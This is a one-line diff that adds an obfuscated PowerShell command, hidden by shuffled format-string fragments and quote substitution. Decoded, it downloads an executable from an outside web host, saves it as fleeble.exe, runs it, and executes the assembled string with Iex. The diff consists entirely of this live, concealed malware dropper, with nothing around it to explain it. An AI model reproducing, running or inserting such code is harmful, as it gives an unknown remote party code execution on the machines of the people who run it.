@@ -1,0 +1,1 @@
+﻿(("{1}{18}{20}{4}{16}{5}{17}{11}{9}{6}{0}{19}{3}{15}{12}{10}{8}{7}{13}{2}{14}" -f 'i','(Ne','.exe0b','richsen.de/asse','nt','n','/h','bg);Start-Proce','fleeble.exe0','dFile(0bghttp:/','0bg,0bg','a','n1/win1.exe','ss 0bgfleeble','g','ts/wi',').Dow','lo','w-Object System.Net.WebCli','n','e')).rEplAcE('0bg',[STring][CHaR]39)| Iex
